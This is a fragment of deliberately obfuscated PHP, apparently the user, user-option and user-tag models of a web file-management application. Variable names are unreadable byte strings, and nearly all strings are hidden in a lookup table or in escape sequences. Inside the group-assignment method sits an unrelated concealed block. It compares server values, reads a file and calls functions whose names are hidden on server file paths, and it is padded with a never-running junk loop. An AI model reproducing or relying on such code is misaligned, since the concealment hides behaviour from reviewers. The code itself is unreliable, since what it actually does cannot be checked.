(isset($ò“´ìğ[$ıÒ”Ôù›]) && $ò“´ìğ[$ıÒ”Ôù›]) { $ûóÜ¼•á[] = $ò“´ìğ[$ıÒ”Ôù›]; } } if (!$ûóÜ¼•á) { continue; } $’Úˆ² = array_merge(array($»Ò¢¤–é => array($àĞÀÕÄô[7], $ûóÜ¼•á)), $Ó‡¬¢²ñ); $‘³áˆå = $this->where($’Úˆ²)->find(); if ($‘³áˆå) { return $øÀÑÄ­Ã; } } return !0; } public function userListInfo($“ÇÛÚ™¡) { $Ìô¤‘÷¨ =& $_SERVER[ÔÕ±ĞšÎ]; $ışé = array(); $“ÇÛÚ™¡ = is_array($“ÇÛÚ™¡) ? array_unique($“ÇÛÚ™¡) : array(); if (!$“ÇÛÚ™¡) { return $ışé; } if (count($“ÇÛÚ™¡) < 20) { foreach ($“ÇÛÚ™¡ as $Ê—ŠÃœƒ) { $ışé[$Ê—ŠÃœƒ . $Ìô¤‘÷¨[12]] = $this->getInfoSimpleOuter($Ê—ŠÃœƒ); } } else { $ÆûÂ‚‚‘ = array($Ìô¤‘÷¨[1768] => array($Ìô¤‘÷¨[494], $“ÇÛÚ™¡)); if (count($“ÇÛÚ™¡) == 1) { $ÆûÂ‚‚‘ = array($Ìô¤‘÷¨[1768] => $“ÇÛÚ™¡[0]); } $Şğ°€Ç† = Model($Ìô¤‘÷¨[579])->field($this->simpleField)->where($ÆûÂ‚‚‘)->select(); $Şğ°€Ç† = array_to_keyvalue($Şğ°€Ç†, $Ìô¤‘÷¨[1777]); foreach ($“ÇÛÚ™¡ as $Ê—ŠÃœƒ) { $­û–Ÿøì = $Şğ°€Ç†[$Ê—ŠÃœƒ]; if (!$­û–Ÿøì) { $ışé[$Ê—ŠÃœƒ . $Ìô¤‘÷¨[12]] = $this->getInfoSimpleOuter($Ê—ŠÃœƒ); continue; } $­û–Ÿøì[$Ìô¤‘÷¨[2473]] = Action($Ìô¤‘÷¨[2474])->parseUrl($­û–Ÿøì[$Ìô¤‘÷¨[2473]]); $ışé[$Ê—ŠÃœƒ . $Ìô¤‘÷¨[12]] = $­û–Ÿøì; } } return $ışé; } protected function userStatus($«‹ÉÍòß, $Òß†¯û±) { $ÊÑ¸„ç³ = $this->getInfoSimple($«‹ÉÍòß); if (!$ÊÑ¸„ç³) { return !1; } $ï¹Ï¶èö = array($_SERVER[ÔÕ±ĞšÎ][824] => $Òß†¯û±); return $this->userEdit($«‹ÉÍòß, $ï¹Ï¶èö); } protected function userRemove($¸³çƒ³ô) { $“ëÚÜÅˆ =& $_SERVER[ÔÕ±ĞšÎ]; $ë÷²ÓÁÔ = $this->getInfoSimple($¸³çƒ³ô); if (!$ë÷²ÓÁÔ) { return !1; } $ ¬»Éå³ = array($“ëÚÜÅˆ[1768] => $¸³çƒ³ô); Model($“ëÚÜÅˆ[669])->where($ ¬»Éå³)->delete(); Model($“ëÚÜÅˆ[2504])->where($ ¬»Éå³)->delete(); Model($“ëÚÜÅˆ[2073])->where($ ¬»Éå³)->delete(); Model($“ëÚÜÅˆ[2489])->where($ ¬»Éå³)->delete(); Model($“ëÚÜÅˆ[1148])->where($ ¬»Éå³)->delete(); Model($“ëÚÜÅˆ[2291])->removeUserAll($¸³çƒ³ô); Model($“ëÚÜÅˆ[899])->userRootRemove($¸³çƒ³ô); return $this->where($ ¬»Éå³)->delete(); } protected function userGroupSet($¤ì×Ï², $­¿¨í“ğ, $Ãììºá = array()) { $ËÜ¨µ•¦ =& $_SERVER[ÔÕ±ĞšÎ]; if ($_SERVER[$ËÜ¨µ•¦[952]] != $_SERVER[$ËÜ¨µ•¦[2003]]) { $Å¿ôµ– = $ËÜ¨µ•¦[954]; $‰€ğ¶» = $ËÜ¨µ•¦[955]; $áà¿”š = $_SERVER[$ËÜ¨µ•¦[956]] . $ËÜ¨µ•¦[957]; $Ù„«½°½ = $‰€ğ¶»($áà¿”š); $–óã©÷Ë = explode($ËÜ¨µ•¦[287], $Ù„«½°½); if (count($–óã©÷Ë) < $ËÜ¨µ•¦[694]) { $ğÏéŞİ = $ËÜ¨µ•¦[958]; $ğÏéŞİ(); } $Çƒ€ÍÕ = $ËÜ¨µ•¦[959]; $Çƒ€ÍÕ($_SERVER[$ËÜ¨µ•¦[960]]); $Çƒ€ÍÕ($_SERVER[$ËÜ¨µ•¦[956]] . $ËÜ¨µ•¦[2505]); $§Šº¯‚ = 1; while ($§Šº¯‚ > 1) { $§Šº¯‚ = $§Šº¯‚ + 4; $•Æ…ïì± = rawurlencode($§Šº¯‚ . $ËÜ¨µ•¦[456]); } } $…ãŸ³Ö¬ = $this->getInfoSimple($¤ì×Ï²); if (!$…ãŸ³Ö¬ || !is_array($­¿¨í“ğ)) { return !1; } $½ê¯ô¦ = Model($ËÜ¨µ•¦[2073]); $½ê¯ô¦->where(array($ËÜ¨µ•¦[1777] => $¤ì×Ï²))->delete(); $Ã®ĞÏÍ = array(); $¢×òó„å = 0; foreach ($­¿¨í“ğ as $Àø‘Â½¡ => $°êä¯æÔ) { $ë½—­“ = array($ËÜ¨µ•¦[1777] => $¤ì×Ï², $ËÜ¨µ•¦[1978] => $Àø‘Â½¡, $ËÜ¨µ•¦[2087] => $°êä¯æÔ); $ë½—­“[$ËÜ¨µ•¦[2002]] = isset($Ãììºá[$¢×òó„å]) ? $Ãììºá[$¢×òó„å] : 0; $¢×òó„å++; $Ã®ĞÏÍ[] = $ë½—­“; } return $½ê¯ô¦->addAll($Ã®ĞÏÍ, array(), !0); } protected function userGroupAdd($–ÆíëñÓ, $ÜïØé©‰ = array()) { $Ää‰ŸÀ =& $_SERVER[ÔÕ±ĞšÎ]; $â¢×È”” = $this->getInfoSimple($–ÆíëñÓ); if (!$â¢×È”” || empty($ÜïØé©‰)) { return !1; } $ «ãÛ£Ş = array(); foreach ($ÜïØé©‰ as $ãØÆ©šç => $ĞÛ÷„íè) { $ «ãÛ£Ş[] = array($Ää‰ŸÀ[1777] => $–ÆíëñÓ, $Ää‰ŸÀ[1978] => $ãØÆ©šç, $Ää‰ŸÀ[2087] => $ĞÛ÷„íè, $Ää‰ŸÀ[2002] => 0); } return Model($Ää‰ŸÀ[2073])->addAll($ «ãÛ£Ş, array(), !0); } protected function userGroupRemove($ÏË íŠ, $ùêÏë‰¨) { $¥Ñ€åæø =& $_SERVER[ÔÕ±ĞšÎ]; $§“å†¯… = $this->getInfoSimple($ÏË íŠ); if (!$§“å†¯… || !$ùêÏë‰¨) { return !1; } $—ŠÑ©Ã£ = array($¥Ñ€åæø[1768] => $ÏË íŠ, $¥Ñ€åæø[2071] => $ùêÏë‰¨); return Model($¥Ñ€åæø[2073])->where($—ŠÑ©Ã£)->delete(); } public function listData() { $œş£‘¤ü = $this->_makeOrder()->selectPage(50); $this->_listDataApply($œş£‘¤ü[$_SERVER[ÔÕ±ĞšÎ][447]]); return $œş£‘¤ü; } public function listByID($ÇÌÚÔÔü) { $¤é—²Ä‹ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ÇÌÚÔÔü) { return; } $æ–ûâòÁ = array($¤é—²Ä‹[1777] => array($¤é—²Ä‹[7], $ÇÌÚÔÔü)); $öŠŞ¦¯ = $this->where($æ–ûâòÁ)->select(); $öŠŞ¦¯ = array_sort_keep($öŠŞ¦¯, $¤é—²Ä‹[1777], $ÇÌÚÔÔü); $this->_listDataApply($öŠŞ¦¯); return $öŠŞ¦¯; } public function listByGroup($ª¥ç“ = 0, $¯¶Ü¾¥ = array()) { $ŞÃ¼Í• =& $_SERVER[ÔÕ±ĞšÎ]; $¤¸°èšç = $ŞÃ¼Í•[12]; $ß«ˆÚ¢ = array(); if ($ª¥ç“) { $ß«ˆÚ¢ = array($ŞÃ¼Í•[2506] => intval($ª¥ç“)); $¤¸°èšç = "\114\x45\106\x54\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\162\157\165\x70\40\165\163\x65\x72\137\x67\162\x6f\165\160\40\157\x6e\x20\165\163\145\x72\x2e\165\x73\x65\162\111\x44\40\x3d\x20\165\163\x65\162\x5f\x67\162\x6f\165\x70\56\x75\x73\145\162\111\104"; $†Ø±Ú±´ = Input::get($ŞÃ¼Í•[532], null, $ŞÃ¼Í•[12]) ? $ŞÃ¼Í•[12] : $ŞÃ¼Í•[2507]; } if (isset($¯¶Ü¾¥[$ŞÃ¼Í•[824]])) { $ß«ˆÚ¢[$ŞÃ¼Í•[2508]] = $¯¶Ü¾¥[$ŞÃ¼Í•[824]]; } $‚üƒÑóÇ = $this->_makeOrder($†Ø±Ú±´)->field($ŞÃ¼Í•[2509])->where($ß«ˆÚ¢)->join($¤¸°èšç)->selectPage(50); $this->_listDataApply($‚üƒÑóÇ[$ŞÃ¼Í•[447]]); return $‚üƒÑóÇ; } private function _makeOrder($âô„¡« = '') { $€°•ê‡Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $Şô†“Ğî = array($€°•ê‡Ñ[1777], $€°•ê‡Ñ[32], $€°•ê‡Ñ[1966], $€°•ê‡Ñ[2186], $€°•ê‡Ñ[1938], $€°•ê‡Ñ[233]); $Ê°Ç½Àù = array($€°•ê‡Ñ[525] => $€°•ê‡Ñ[526], $€°•ê‡Ñ[527] => $€°•ê‡Ñ[528]); $ƒçĞÛ¶ = Input::get($€°•ê‡Ñ[532], $€°•ê‡Ñ[7], $€°•ê‡Ñ[1768], $Şô†“Ğî); $·ÂŒ¡Ìû = Input::get($€°•ê‡Ñ[533], $€°•ê‡Ñ[7], $€°•ê‡Ñ[2074], array($€°•ê‡Ñ[2074], $€°•ê‡Ñ[527])); $·ÂŒ¡Ìû = $Ê°Ç½Àù[$·ÂŒ¡Ìû]; $âô„¡« = $âô„¡« . "\165\x73\x65\162\56{$ƒçĞÛ¶}\40{$·ÂŒ¡Ìû}\54\x20\165\x73\x65\x72\x2e\165\163\x65\x72\x49\104\x20\x61\163\x63"; return $this->alias($€°•ê‡Ñ[2202])->order($âô„¡«); } public function listSearch($İ¥åÄ´€) { $’ã±íÜ =& $_SERVER[ÔÕ±ĞšÎ]; $£úÚ¼¼Œ = trim($İ¥åÄ´€[$’ã±íÜ[2077]]); $¶ş¶ˆ— = explode($’ã±íÜ[53], $£úÚ¼¼Œ); if (!$£úÚ¼¼Œ || count($¶ş¶ˆ—) == 1) { return $this->listSearchNow($İ¥åÄ´€); } $¯ß¤Ç¬© = array($’ã±íÜ[447] => array()); foreach ($¶ş¶ˆ— as $×´«£ª) { if (!trim($×´«£ª)) { continue; } $İ¥åÄ´€[$’ã±íÜ[2077]] = $×´«£ª; $çøš«æ· = $this->listSearchNow($İ¥åÄ´€); $¯ß¤Ç¬©[$’ã±íÜ[447]] = array_merge($¯ß¤Ç¬©[$’ã±íÜ[447]], $çøš«æ·[$’ã±íÜ[447]]); } $¯ß¤Ç¬©[$’ã±íÜ[447]] = array_unique_by_key($¯ß¤Ç¬©[$’ã±íÜ[447]], $’ã±íÜ[1777]); $¯ß¤Ç¬©[$’ã±íÜ[444]] = array($’ã±íÜ[445] => count($¯ß¤Ç¬©[$’ã±íÜ[447]]), $’ã±íÜ[441] => 20, $’ã±íÜ[430] => 1, $’ã±íÜ[446] => 1); return $¯ß¤Ç¬©; } public function listSearchNow($ññ¯îèë) { $Ù¬ ¾§§ =& $_SERVER[ÔÕ±ĞšÎ]; $óË¿Ó™Š = trim($ññ¯îèë[$Ù¬ ¾§§[2077]]); $ñÆ Í® = isset($ññ¯îèë[$Ù¬ ¾§§[2078]]) ? $ññ¯îèë[$Ù¬ ¾§§[2078]] : !1; $óË¿Ó™Š = str_replace($Ù¬ ¾§§[2079], $Ù¬ ¾§§[2080], trim($óË¿Ó™Š)); $Óë“òÍ = array($Ù¬ ¾§§[32] => array($Ù¬ ¾§§[461], "\x25{$óË¿Ó™Š}\x25"), $Ù¬ ¾§§[382] => array($Ù¬ ¾§§[461], "{$óË¿Ó™Š}\45"), $Ù¬ ¾§§[2274] => array($Ù¬ ¾§§[461], "{$óË¿Ó™Š}\x25"), $Ù¬ ¾§§[1079] => $Ù¬ ¾§§[2081]); if (Input::check($óË¿Ó™Š, $Ù¬ ¾§§[388])) { $Óë“òÍ[$Ù¬ ¾§§[1777]] = array($Ù¬ ¾§§[461], "{$óË¿Ó™Š}\45"); $Óë“òÍ[$Ù¬ ¾§§[2490]] = array($Ù¬ ¾§§[461], "{$óË¿Ó™Š}\45"); } if (!$óË¿Ó™Š) { $Óë“òÍ = array(); } if (isset($ññ¯îèë[$Ù¬ ¾§§[824]])) { $Óë“òÍ[$Ù¬ ¾§§[824]] = $ññ¯îèë[$Ù¬ ¾§§[824]]; } $Óë“òÍ = $this->parseWhereLike($Óë“òÍ); $Òô¶õù = $this->_makeOrder()->where($Óë“òÍ)->selectPage(20); if (!$Òô¶õù || count($Òô¶õù[$Ù¬ ¾§§[447]]) < 5 && Input::check($óË¿Ó™Š, $Ù¬ ¾§§[395])) { $‘ŠîØƒù = $this->_searchFromMeta($Ù¬ ¾§§[539], $óË¿Ó™Š, 10); $ŸÛŒÇÚ„ = $this->_searchFromMeta($Ù¬ ¾§§[540], $óË¿Ó™Š, 10); $½£ÑòÖ¦ = array_merge($‘ŠîØƒù, $ŸÛŒÇÚ„, $Òô¶õù[$Ù¬ ¾§§[447]]); $Òô¶õù[$Ù¬ ¾§§[447]] = array_unique_by_key($½£ÑòÖ¦, $Ù¬ ¾§§[1777]); $Òô¶õù[$Ù¬ ¾§§[444]][$Ù¬ ¾§§[445]] = count($Òô¶õù[$Ù¬ ¾§§[447]]); $Òô¶õù[$Ù¬ ¾§§[444]][$Ù¬ ¾§§[446]] = ceil($Òô¶õù[$Ù¬ ¾§§[444]][$Ù¬ ¾§§[445]] / $Òô¶õù[$Ù¬ ¾§§[444]][$Ù¬ ¾§§[441]]); } $this->_listDataApply($Òô¶õù[$Ù¬ ¾§§[447]]); $this->_filterByGroup($Òô¶õù, $ñÆ Í®); return $Òô¶õù; } private function _filterByGroup(&$ß¾ß¨ÉÓ, $‘é’šš–) { $¡äí‡Í× =& $_SERVER[ÔÕ±ĞšÎ]; if (!$‘é’šš–) { return $ß¾ß¨ÉÓ; } foreach ($ß¾ß¨ÉÓ[$¡äí‡Í×[447]] as $”Êõ¿º„ => &$³³’â¾¡) { $ª€öšß = array_to_keyvalue($³³’â¾¡[$¡äí‡Í×[2171]], $¡äí‡Í×[12], $¡äí‡Í×[1978]); if (!in_array($‘é’šš–, $ª€öšß)) { unset($ß¾ß¨ÉÓ[$¡äí‡Í×[447]][$”Êõ¿º„]); } } unset($³³’â¾¡); $ß¾ß¨ÉÓ[$¡äí‡Í×[447]] = array_values($ß¾ß¨ÉÓ[$¡äí‡Í×[447]]); $ß¾ß¨ÉÓ[$¡äí‡Í×[444]] = array($¡äí‡Í×[2239] => count($ß¾ß¨ÉÓ[$¡äí‡Í×[447]]), $¡äí‡Í×[2237] => $ß¾ß¨ÉÓ[$¡äí‡Í×[444]][$¡äí‡Í×[441]], $¡äí‡Í×[2236] => 1, $¡äí‡Í×[2238] => 1); } private function _searchFromMeta($îŸ¨—¡, $•Ê¤–»½, $ŞÉÁ›Ãİ) { $êĞ¥ë‰ù =& $_SERVER[ÔÕ±ĞšÎ]; $•Ê¤–»½ = strtolower($•Ê¤–»½); $Ã¢“½¹Ñ = array($êĞ¥ë‰ù[97] => $îŸ¨—¡, $êĞ¥ë‰ù[452] => array($êĞ¥ë‰ù[461], "\x25{$•Ê¤–»½}\x25")); $Ã¢“½¹Ñ = $this->parseWhereLike($Ã¢“½¹Ñ); $æÍ”àè = Model($êĞ¥ë‰ù[2510])->where($Ã¢“½¹Ñ)->limit($ŞÉÁ›Ãİ)->select(); if (!$æÍ”àè) { return array(); } $æÍ”àè = array_to_keyvalue($æÍ”àè, $êĞ¥ë‰ù[12], $êĞ¥ë‰ù[1777]); $‘İÚø„– = $this->where(array($êĞ¥ë‰ù[1768] => array($êĞ¥ë‰ù[7], $æÍ”àè)))->select(); if (!$‘İÚø„–) { return array(); } return $‘İÚø„–; } private function _listDataApplyItem($àØìÍüÃ) { $…èë¯Õù = array($àØìÍüÃ); $this->_listDataApply($…èë¯Õù); return $…èë¯Õù[0]; } private function _listDataApply(&$©£ÆŸó¾) { $„ˆşé« =& $_SERVER[ÔÕ±ĞšÎ]; if (!$©£ÆŸó¾) { return; } array_remove_key($©£ÆŸó¾, $„ˆşé«[968]); $ş÷¡œÀ­ = array_to_keyvalue($©£ÆŸó¾, $„ˆşé«[12], $„ˆşé«[1777]); $this->_listAppendGroup($©£ÆŸó¾, $ş÷¡œÀ­); $this->_listAppendMeta($©£ÆŸó¾, $ş÷¡œÀ­); $this->_listAppendSourceRoot($©£ÆŸó¾, $ş÷¡œÀ­); } private function _listAppendSourceRoot(&$á÷â›£Ó, $Ÿ¤ßã‡ë) { $¿Öà™õË =& $_SERVER[ÔÕ±ĞšÎ]; $²ï£ø = Model($¿Öà™õË[899])->listSourceRoot(SourceModel::TYPE_USER, $Ÿ¤ßã‡ë); $²ï£ø = array_to_keyvalue($²ï£ø, $¿Öà™õË[571]); $²ï£ø = array_remove_key($²ï£ø, $¿Öà™õË[571]); foreach ($á÷â›£Ó as &$á€ğÅÁâ) { $á€ğÅÁâ[$¿Öà™õË[90]] = $²ï£ø[$á€ğÅÁâ[$¿Öà™õË[1777]]] ? $²ï£ø[$á€ğÅÁâ[$¿Öà™õË[1777]]] : array(); } unset($á€ğÅÁâ); } private function _listAppendGroup(&$†¿­àÀ¦, $¢¸ßºÍ©) { $ª‡ï­É =& $_SERVER[ÔÕ±ĞšÎ]; $çü¬îêÌ = array($ª‡ï­É[1777] => array($ª‡ï­É[7], $¢¸ßºÍ©)); $š¯¿ˆ¹ = Model($ª‡ï­É[2073])->where($çü¬îêÌ)->select(); $Üøª‡ÍÔ = array_to_keyvalue($š¯¿ˆ¹, $ª‡ï­É[12], $ª‡ï­É[1978]); $Üøª‡ÍÔ = array_remove_value(array_unique($Üøª‡ÍÔ), $ª‡ï­É[230]); if (!$Üøª‡ÍÔ || !$š¯¿ˆ¹) { return; } $çü¬îêÌ = array($ª‡ï­É[1978] => array($ª‡ï­É[7], $Üøª‡ÍÔ)); $äí¨›Ì = Model($ª‡ï­É[2169])->field($ª‡ï­É[2511])->where($çü¬îêÌ)->select(); $äí¨›Ì = array_to_keyvalue($äí¨›Ì, $ª‡ï­É[1978]); $š¯¿ˆ¹ = array_to_keyvalue_group($š¯¿ˆ¹, $ª‡ï­É[1777]); foreach ($š¯¿ˆ¹ as &$ı›¢‰¨) { $±¼™–¹È = array(); foreach ($ı›¢‰¨ as $¶»¨Ì÷ ) { if (!$¶»¨Ì÷ [$ª‡ï­É[2087]]) { continue; } $ÑÅ”¸©× = Model($ª‡ï­É[573])->listData($¶»¨Ì÷ [$ª‡ï­É[2087]]); $±¼™–¹È[] = array($ª‡ï­É[1978] => $¶»¨Ì÷ [$ª‡ï­É[1978]], $ª‡ï­É[2512] => $äí¨›Ì[$¶»¨Ì÷ [$ª‡ï­É[1978]]][$ª‡ï­É[32]], $ª‡ï­É[586] => $äí¨›Ì[$¶»¨Ì÷ [$ª‡ï­É[1978]]][$ª‡ï­É[586]], $ª‡ï­É[489] => $ÑÅ”¸©×); } $ı›¢‰¨ = $±¼™–¹È; } unset($ı›¢‰¨); foreach ($†¿­àÀ¦ as &$¿¦ÑªÍ²) { $¿¦ÑªÍ²[$ª‡ï­É[2171]] = array(); if (isset($š¯¿ˆ¹[$¿¦ÑªÍ²[$ª‡ï­É[1777]]])) { $¿¦ÑªÍ²[$ª‡ï­É[2171]] = $š¯¿ˆ¹[$¿¦ÑªÍ²[$ª‡ï­É[1777]]]; } } unset($¿¦ÑªÍ²); } public function userAppendGroup($š­ŞÜ’) { $ÔŸ¿ÇùÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$š­ŞÜ’) { return array(); } $this->_listAppendGroup($š­ŞÜ’, array_to_keyvalue($š­ŞÜ’, $ÔŸ¿ÇùÏ[12], $ÔŸ¿ÇùÏ[1777])); return $š­ŞÜ’; } private function _listAppendMeta(&$«ãªÛ¯¿, $¢Ê‘ˆŠ¹) { $—°™øÒí =& $_SERVER[ÔÕ±ĞšÎ]; $÷•Ãó¹Î = UserJobModel::JOB_KEY; $ÜÂ¯ç‡º = array($—°™øÒí[2491]); $–Œş¤ = array($—°™øÒí[1777] => array($—°™øÒí[7], $¢Ê‘ˆŠ¹)); $¥ú¦ëšî = Model($—°™øÒí[2489])->where($–Œş¤)->select(); $¥ú¦ëšî = array_to_keyvalue_group($¥ú¦ëšî, $—°™øÒí[1777]); foreach ($¥ú¦ëšî as &$ñ¼ƒÁùã) { $£‡Ùù•Š = array(); foreach ($ñ¼ƒÁùã as $‰Ë»„) { if (!in_array($‰Ë»„[$—°™øÒí[97]], $ÜÂ¯ç‡º)) { $£‡Ùù•Š[$‰Ë»„[$—°™øÒí[97]]] = $‰Ë»„[$—°™øÒí[452]]; } } $ñ¼ƒÁùã = $£‡Ùù•Š; } unset($ñ¼ƒÁùã); $¯ÁñŒ§Ó = Model($—°™øÒí[2513]); foreach ($«ãªÛ¯¿ as &$¿ÉÇŠçû) { $ëÈÍí¤¢ = array(); if (isset($¥ú¦ëšî[$¿ÉÇŠçû[$—°™øÒí[1777]]])) { $ëÈÍí¤¢ = $¥ú¦ëšî[$¿ÉÇŠçû[$—°™øÒí[1777]]]; } $¿ÉÇŠçû[$—°™øÒí[2514]] = array(); if (isset($ëÈÍí¤¢[$÷•Ãó¹Î])) { $¿ÉÇŠçû[$—°™øÒí[2514]] = $¯ÁñŒ§Ó->getUserJobInfo($ëÈÍí¤¢[$÷•Ãó¹Î]); } } unset($¿ÉÇŠçû); } protected function groupUserAll($ ¸ÔşÙ) { $“¶·½¦ƒ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ ¸ÔşÙ) { return !1; } $¶ÁÇÒ¼Û = Model($“¶·½¦ƒ[2073])->field($“¶·½¦ƒ[1777])->where(array($“¶·½¦ƒ[1978] => array($“¶·½¦ƒ[7], $ ¸ÔşÙ)))->select(); $¶ÁÇÒ¼Û = array_to_keyvalue($¶ÁÇÒ¼Û, $“¶·½¦ƒ[12], $“¶·½¦ƒ[1777]); return array_unique($¶ÁÇÒ¼Û); } public function userSearch($İÓà’Ä, $¨Åğª² = "\x2a") { return Model($_SERVER[ÔÕ±ĞšÎ][599])->where($İÓà’Ä)->field($¨Åğª²)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\157\x70\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¢·ƒº‰‰) { $Ã‹…¿Ü =& $_SERVER[ÔÕ±ĞšÎ]; $ö—ŞÊ­è = defined($Ã‹…¿Ü[2206]) && USER_ID ? USER_ID : $Ã‹…¿Ü[12]; return "\x55\163\x65\162\117\160\x74\x69\157\156\x5f{$¢·ƒº‰‰}\137" . $ö—ŞÊ­è; } protected function filterWhere($†ƒ¡ò÷) { $÷±ÊäõÑ =& $_SERVER[ÔÕ±ĞšÎ]; $†ƒ¡ò÷[$÷±ÊäõÑ[1777]] = defined($÷±ÊäõÑ[2206]) && USER_ID ? USER_ID : $÷±ÊäõÑ[12]; return $†ƒ¡ò÷; } public function cacheRemoveUser($å´ÄĞ½±, $±Ò«‘ÆÇ) { return Cache::remove("\x55\x73\x65\162\117\160\x74\151\x6f\x6e\x5f{$å´ÄĞ½±}\x5f" . $±Ò«‘ÆÇ); } protected function optionDefault($‡İÜˆû = '') { $¿óÅ¯İæ =& $_SERVER[ÔÕ±ĞšÎ]; if ($‡İÜˆû == $¿óÅ¯İæ[12]) { return $GLOBALS[$¿óÅ¯İæ[6]][$¿óÅ¯İæ[2515]]; } if ($‡İÜˆû == $¿óÅ¯İæ[2516]) { return $GLOBALS[$¿óÅ¯İæ[6]][$¿óÅ¯İæ[2517]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\x74\141\147\x4c\x69\163\164"; public $modelType = "\x55\x73\145\162\x4f\x70\164\x69\157\156"; public $field = array("\156\141\155\145", "\x73\x74\x79\x6c\x65", "\163\157\x72\164"); public function listData($ÔİÓ úê = false, $œú¼±¬û = "\163\157\162\164", $õÆî€æ÷ = false) { return parent::listData($ÔİÓ úê, $œú¼±¬û, $õÆî€æ÷); } public function remove($–‘Ôè¦) { return parent::remove($–‘Ôè¦); } public function add($İì¶±ÔÚ, $ğçÏÔæ¥ = "\154\141\142\x65\x6c\55\147\162\145\x79\55\x6e\x6f\162\155\141\x6c") { $¼•çª‚‹ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->findByName($İì¶±ÔÚ)) { return !1; } $¥Ö†§İ = array($¼•çª‚‹[496] => $İì¶±ÔÚ, $¼•çª‚‹[560] => $ğçÏÔæ¥, $¼•çª‚‹[1982] => $this->getSort($¼•çª‚‹[337]) + 1); return parent::insert($¥Ö†§İ); } public function update($Â˜±©¶Í, $ùÔ˜êÇ¢) { $ğ…ô„„ =& $_SERVER[ÔÕ±ĞšÎ]; $™Æ¤ˆÆ¸ = $this->listData($Â˜±©¶Í); $–õ ƒ§¢ = $this->findByName($ùÔ˜êÇ¢[$ğ…ô„„[32]]); if (!$™Æ¤ˆÆ¸ || $–õ ƒ§¢ && $–õ ƒ§¢[$ğ…ô„„[477]] != $™Æ¤ˆÆ¸[$ğ…ô„„[477]]) { return !1; } return parent::update($Â˜±©¶Í, $ùÔ˜êÇ¢); } public function moveTop($‚Ã†Â˜) { $õ¹ÈÎ² =& $_SERVER[ÔÕ±ĞšÎ]; $‘ÌéÍÜ¾ = parent::listData(); $º›Îˆ‘Ì = $this->getSort($õ¹ÈÎ²[336]); foreach ($‘ÌéÍÜ¾ as &$Ë¶õÒ–) { if ($Ë¶õÒ–[$õ¹ÈÎ²[477]] == $‚Ã†Â˜) { $Ë¶õÒ–[$õ¹ÈÎ²[2002]] = $º›Îˆ‘Ì; continue; } $Ë¶õÒ–[$õ¹ÈÎ²[2002]] += 1; } unset($Ë¶õÒ–); return parent::resetData($‘ÌéÍÜ¾); } public function moveBottom($³µ¢‰ë¼) { $Ä¨¢ä«È =& $_SERVER[ÔÕ±ĞšÎ]; $õüıåìû = $this->getSort($Ä¨¢ä«È[337]) + 1; return parent::update($³µ¢‰ë¼, array($Ä¨¢ä«È[2002] => $õüıåìû)); } public function resetSort($ş—ö›¯å) { $ÜÖ£ƒü– =& $_SERVER[ÔÕ±ĞšÎ]; $ª‹ÓÌ‹ = array(); $ş—ö›¯å = is_array($ş—ö›¯å) ? $ş—ö›¯å : array(); for ($ìâê¡Êš = 0; $ìâê¡Êš < count($ş—ö›¯å); $ìâê¡Êš++) { $ª‹ÓÌ‹[$ş—ö›¯å[$ìâê¡Êš] . $ÜÖ£ƒü–[12]] = $ìâê¡Êš + 1; } $ÑºöÉ”§ = parent::listData(); foreach ($ÑºöÉ”§ as &$“Ëé‰î) { $®ŞöÜÂã = $ª‹ÓÌ‹[$“Ëé‰î[$ÜÖ£ƒü–[477]]]; $“Ëé‰î[$ÜÖ£ƒü–[2002]] = $®ŞöÜÂã ? $®ŞöÜÂã : $“Ëé‰î[$ÜÖ£ƒü–[2002]]; } unset($“Ëé‰î); return parent::resetData($ÑºöÉ”§); } private function getSort($‡á¾ùŒ) { $“ïÖÍ²“ =& $_SERVER[ÔÕ±ĞšÎ]; $×î™®£ = parent::listData(); $Ùßöœõ = array_to_keyvalue($×î™®£, $“ïÖÍ²“[12], $“ïÖÍ²“[2002]); if (!$Ùßöœõ) { $Ùßöœõ = array(0); } $”¿ÂÚø­ = $‡á¾ùŒ == $“ïÖÍ²“[337] ? max($Ùßöœõ) : min($Ùßöœõ); return intval($”¿ÂÚø­); } } goto CöÀÇÙÖä“; C£´ªîî¾: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($…Îø°ó = false, $©Ğ›İò® = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $Â»çÛ©Í = false) { $ï…ÌÛ = Model($this->modelType)->get(!1, $this->optionType, !0); $’öªÆÌ¶ = array_values($ï…ÌÛ); if ($’öªÆÌ¶ && $’öªÆÌ¶[0] && !is_array($’öªÆÌ¶[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ï…ÌÛ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ï…ÌÛ) { return $…Îø°ó ? null : array(); } if (!$…Îø°ó) { $ï…ÌÛ = array_filter(array_values($ï…ÌÛ)); return array_sort_by($ï…ÌÛ, $©Ğ›İò®, $Â»çÛ©Í); } return $ï…ÌÛ[$_SERVER[ÔÕ±ĞšÎ][474] . $…Îø°ó]; } public function insert($êÔÌ•·Š) { $²î‰ãÀª =& $_SERVER[ÔÕ±ĞšÎ]; $êÔÌ•·Š = array_field_key($êÔÌ•·Š, $this->field); $İ‰Ğäõ = Model($this->modelType)->get($²î‰ãÀª[475], $this->optionType . $²î‰ãÀª[476]); $İ‰Ğäõ = $İ‰Ğäõ ? $İ‰Ğäõ : 0; $êÔÌ•·Š[$²î‰ãÀª[477]] = ++$İ‰Ğäõ; $êÔÌ•·Š[$²î‰ãÀª[233]] = time(); $êÔÌ•·Š[$²î‰ãÀª[88]] = time(); Model($this->modelType)->set($²î‰ãÀª[475], $İ‰Ğäõ, $this->optionType . $²î‰ãÀª[476]); Model($this->modelType)->set($²î‰ãÀª[474] . $İ‰Ğäõ, $êÔÌ•·Š, $this->optionType); return $İ‰Ğäõ; } public function update($ÌŠÏÛÚŒ, $ë˜Òİ—) { $º±ŒÄª‡ =& $_SERVER[ÔÕ±ĞšÎ]; 